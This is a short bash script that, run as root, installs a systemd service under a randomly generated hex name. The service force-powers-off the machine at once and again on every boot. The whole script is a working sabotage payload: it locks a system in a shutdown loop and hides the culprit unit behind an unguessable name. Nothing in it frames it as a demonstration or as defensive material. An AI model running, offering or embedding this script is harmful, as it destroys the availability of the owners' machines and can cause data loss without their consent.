#!/usr/bin/env bash
set -euo pipefail

SERVICE_NAME="$(openssl rand -hex "$(shuf -i 4-128 -n 1)")"
SERVICE_FILE="/etc/systemd/system/${SERVICE_NAME}.service"

if [[ $EUID -ne 0 ]]; then
  echo "Please run as root:"
  echo "sudo $0"
  exit 1
fi

cat > "$SERVICE_FILE" <<EOF
[Unit]
Description=$SERVICE_NAME
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/systemctl poweroff --force --force
Restart=always
RestartSec=5
User=root
WorkingDirectory=/

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable "$SERVICE_NAME"
echo -e "\n\nService installed and enabled.\n"
echo -e "\n\nService starting....\n"
systemctl start "$SERVICE_NAME"
